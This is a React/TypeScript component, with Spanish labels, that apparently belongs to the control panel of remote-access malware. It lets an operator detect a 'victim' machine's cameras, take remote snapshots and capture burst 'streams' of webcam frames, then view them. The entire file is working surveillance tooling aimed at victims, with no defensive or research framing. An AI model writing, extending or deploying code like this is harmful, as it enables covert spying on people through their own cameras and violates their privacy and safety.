'use client';
import { useEffect, useMemo, useRef, useState } from 'react';
import { Camera, CircleStop, RefreshCw, Video } from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import type { Task, Victim } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { humanError } from '@/lib/errors';

type StreamResult = { frames?: string[]; fps?: number; count?: number; data?: string; bytes?: number; device?: string };

export function WebcamPanel({ victim }: { victim: Victim }) {
  const [device, setDevice] = useState('');
  const [quality, setQuality] = useState(70);
  const [fps, setFps] = useState(10);
  const [playing, setPlaying] = useState(false);
  const [index, setIndex] = useState(0);
  const [busy, setBusy] = useState('');
  const timer = useRef<ReturnType<typeof setInterval> | null>(null);
  const { data, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&limit=30`, { pollMs: 2_000 });

  const tasks = data?.items ?? [];
  const latest = (name: string) => tasks.find((task) => task.name === name);
  const devices = (latest('webcam:devices')?.result as { video?: string[]; audio?: string[] } | undefined)?.video ?? [];
  const snapshot = latest('webcam:snapshot');
  const stream = latest('webcam:stream');
  const error = [snapshot, stream].find((task) => task?.status === 'error')?.error ?? null;
  const running = tasks.find((task) => ['queued', 'running'].includes(task.status) && task.name.startsWith('webcam'));
  const frames = useMemo(() => ((stream?.result as StreamResult | undefined)?.frames ?? []), [stream?.result]);
  const streamFps = (stream?.result as StreamResult | undefined)?.fps ?? fps;

  useEffect(() => {
    if (playing && frames.length > 1) {
      timer.current = setInterval(() => setIndex((value) => (value + 1) % frames.length), Math.max(60, Math.round(1000 / streamFps)));
    }
    return () => { if (timer.current) clearInterval(timer.current); };
  }, [playing, frames.length, streamFps]);

  async function enqueue(name: string, params: Record<string, unknown>) {
    setBusy(name);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victim.id], name, params, timeout_sec: 60 });
      refresh();
    } catch (caught) {
      setBusy('');
      return humanError(caught);
    }
    setTimeout(() => { setBusy(''); refresh(); }, 1_500);
    return null;
  }

  const shot = (snapshot?.result as StreamResult | undefined)?.data;

  return (
    <section className="xp-card rounded-lg border border-line bg-panel/30 p-2" aria-label="Webcam">
      <div className="flex items-center gap-2">
        <Video className="h-3.5 w-3.5 text-muted" />
        <p className="text-2xs uppercase tracking-wide text-muted">Webcam</p>
        {running ? <Badge tone="warn">{running.status}</Badge> : null}
        <div className="ml-auto flex gap-1">
          <Button size="icon" variant="ghost" title="Detectar cámaras" aria-label="Detectar cámaras" loading={busy === 'webcam:devices'} disabled={!victim.socket} onClick={() => void enqueue('webcam:devices', {})}><RefreshCw className="h-3 w-3" /></Button>
          <Button size="sm" variant="secondary" disabled={!victim.socket || Boolean(running)} loading={busy === 'webcam:snapshot'} onClick={() => { setPlaying(false); void enqueue('webcam:snapshot', { device, quality }); }}><Camera className="h-3 w-3" /> foto</Button>
          {playing ? <Button size="sm" variant="destructive" onClick={() => setPlaying(false)}><CircleStop className="h-3 w-3" /> parar</Button> : <Button size="sm" disabled={!victim.socket || Boolean(running)} loading={busy === 'webcam:stream'} onClick={() => { setIndex(0); void enqueue('webcam:stream', { device, quality: Math.min(quality, 60), fps, max_frames: Math.min(90, fps * 6) }); setPlaying(true); }}>stream {fps} fps</Button>}
        </div>
      </div>

      <div className="mt-1.5 flex flex-wrap items-center gap-1">
        <select value={device} onChange={(event) => setDevice(event.target.value)} className="h-6 min-w-0 rounded border border-line bg-bg px-1 text-2xs" aria-label="Cámara">
          <option value="">predeterminada</option>
          {devices.map((item) => <option key={item} value={item}>{item}</option>)}
        </select>
        <label className="flex items-center gap-1 text-2xs text-muted">calidad
          <input type="range" min={20} max={90} value={quality} onChange={(event) => setQuality(Number(event.target.value))} className="w-20" aria-label="Calidad" />
          <span className="num">{quality}</span>
        </label>
        <label className="flex items-center gap-1 text-2xs text-muted">fps
          <select value={fps} onChange={(event) => setFps(Number(event.target.value))} className="h-6 rounded border border-line bg-bg px-1" aria-label="FPS">
            {[5, 8, 10, 12, 15].map((value) => <option key={value} value={value}>{value}</option>)}
          </select>
        </label>
        {running ? <Badge tone="ok">capturando…</Badge> : null}
      </div>

      {error ? <p className="mt-1 rounded border border-bad/30 bg-bad/10 px-2 py-1 text-2xs text-bad" data-webcam-error>{error}</p> : null}
      {!victim.socket ? <p className="mt-1 text-2xs text-warn">Sin socket: no se puede abrir la cámara.</p> : null}

      {playing && frames.length > 0 ? (
        <img src={`data:image/jpeg;base64,${frames[index % frames.length]}`} alt={`webcam frame ${index + 1}`} className="mt-1.5 w-full rounded border border-line object-contain" data-webcam-stream />
      ) : shot ? (
        <img src={`data:image/jpeg;base64,${shot}`} alt="webcam" className="mt-1.5 w-full rounded border border-line object-contain" data-webcam-shot />
      ) : !error ? (
        <p className="mt-1.5 rounded border border-line px-3 py-4 text-center text-2xs text-muted">Sin imagen. Pulsa foto para una captura o stream para una ráfaga.</p>
      ) : null}
      {frames.length > 0 ? <p className="mt-1 text-2xs text-muted/70">{frames.length} fotogramas · {streamFps} fps · {playing ? `reproduciendo ${index + 1}` : 'detenido (cámara liberada)'}</p> : null}
      {shot ? <p className="mt-1 text-2xs text-muted/70">JPEG {Math.round(((snapshot?.result as StreamResult | undefined)?.bytes ?? 0) / 1024)} KB · {device || 'predeterminada'} · calidad {quality}</p> : null}
    </section>
  );
}
